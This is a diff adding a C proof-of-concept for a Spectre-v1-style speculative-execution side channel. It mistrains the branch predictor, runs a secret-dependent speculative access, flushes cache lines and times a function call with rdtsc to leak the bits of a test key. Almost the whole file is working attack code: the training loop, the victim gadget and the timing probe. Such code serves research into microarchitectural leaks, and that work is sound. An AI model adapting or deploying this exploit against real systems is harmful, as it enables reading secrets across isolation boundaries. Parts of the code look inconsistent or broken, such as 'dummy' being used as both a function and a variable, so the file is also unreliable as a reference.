@@ -1,0 +1,163 @@
+#include <stdio.h>
+#include <stdint.h> 
+#include <stdlib.h>
+#include <fcntl.h>
+#include <linux/types.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <inttypes.h>
+#include <errno.h>
+#include <string.h>
+#include <stdbool.h>
+#ifdef _MSC_VER
+#include <intrin.h> /* for rdtscp and clflush */
+#pragma optimize("gt",on)
+#else
+#include <x86intrin.h> /* for rdtscp and clflush */
+#endif
+#include "dummy.h"
+#define L1_BLOCK_SZ_BYTES   64
+#define TRAIN_TIMES         1023  
+#define ROUNDS              1    // run the train + attack sequence X amount of times (for redundancy)
+#define ATTACK_SAME_ROUNDS  10   // amount of times to attack the same index
+#define SECRET_SZ           19
+#define CACHE_HIT_THRESHOLD 79
+#define BARRIER asm volatile ("lfence;\nmfence;\nsfence");
+uint64_t array1_sz = 16;
+uint64_t check = 1;
+uint8_t unused1[64];
+uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
+uint8_t unused2[64];
+uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
+// char*   secretString = "PASSWORD_SPECTRE_V1";
+int secret;
+int KEY='W';
+
+static inline uint64_t start_time(void)
+{
+	uint64_t t;
+	asm volatile(
+		"lfence\n\t"
+		"rdtsc\n\t"
+		"shl $32, %%rdx\n\t"
+		"or %%rdx, %0\n\t"
+		"lfence"
+		: "=a"(t) /*output*/
+		:
+		: "rdx", "memory", "cc");
+	return t;
+}
+
+/**
+ * This function is modified from:
+ *  https://github.com/google/highwayhash/blob/master/highwayhash/tsc_timer.h
+ */
+static inline uint64_t stop_time(void)
+{
+	uint64_t t;
+	asm volatile(
+		"rdtscp\n\t"
+		"shl $32, %%rdx\n\t"
+		"or %%rdx, %0\n\t"
+		"lfence"
+		: "=a"(t) /*output*/
+		:
+		: "rcx", "rdx", "memory", "cc");
+	return t;
+}
+
+
+void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
+    outValArray[0] = 0; outValArray[1] = 0;
+    for (uint64_t i = 0; i < inArraySize; ++i) {
+        if (inArray[i] > outValArray[0]) {
+            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
+            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
+        }
+        else if (inArray[i] > outValArray[1]) {
+            outValArray[1] = inArray[i]; outIdxArray[1] = i;
+        }
+    }
+}
+
+int temp,acc;
+void victimFunc(uint64_t idx,uint64_t effSec) {
+    //   printf("secret%d\n",effSec);
+     _mm_clflush(&array1_sz);
+    _mm_clflush(&array2[40*L1_BLOCK_SZ_BYTES]);
+     volatile unsigned int *arr = &array2[0*L1_BLOCK_SZ_BYTES];
+     volatile unsigned int *s = &effSec;
+     temp &= array2[4* L1_BLOCK_SZ_BYTES];
+     temp &= array2[0 * L1_BLOCK_SZ_BYTES];
+     temp &= effSec;
+     _mm_clflush(&array2[40*L1_BLOCK_SZ_BYTES]);
+    BARRIER 
+   
+    if (idx < array1_sz) {
+
+    acc=effSec?40:4;
+    volatile unsigned int *t=&array2[acc * L1_BLOCK_SZ_BYTES];
+    asm volatile(
+    " mov (%0), %%r15\n"
+    ".rept 127\n"
+    " add %%r15, %%r15\n"
+    " .endr\n"
+    "call dummy\n" 
+    : "+r"(t)
+    :
+    : "%r13","%r15","memory"
+    );
+
+        }
+    
+}
+
+int main(void) {
+    uint64_t attackIdx = 40;//(uint64_t)(secretString - (char*)array1);
+    uint64_t start, diff, passInIdx, randIdx,effIdx,effSec;
+    // uint8_t dummy = 0;
+    static uint64_t results[256];
+
+    for(int len = 7; len >=0; --len) {
+        // for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
+        int junk = 0;
+        int train = 0;
+        register uint64_t time1, time2;
+        volatile uint8_t *addr;
+        secret=(KEY>>len)&1;
+        array2[4*L1_BLOCK_SZ_BYTES]=1;
+        array2[40*L1_BLOCK_SZ_BYTES]=40;
+        // printf("secret%d\n",secret);
+
+            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
+                randIdx = 3;
+                
+                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
+                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
+                effIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
+                effSec =(train ^ (passInIdx & (secret ^ train)));
+                _mm_clflush(&array2[40*L1_BLOCK_SZ_BYTES]);
+                _mm_clflush(&dummy); 
+                BARRIER 
+                for(uint64_t k = 0; k < 10; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
+                // call function to tsrain or attack
+                victimFunc(effIdx,effSec);
+            }
+
+         
+
+                uint64_t  uiTemp = 0;  //introduced a dummy variable to prevent compiler optimizations
+                uint64_t access_time2 = start_time();
+                dummy();
+                uint64_t start = stop_time() - access_time2;
+                 printf("%d,%d\n",(start > 120), start);
+
+
+
+    }
+
+    return 0;
+}
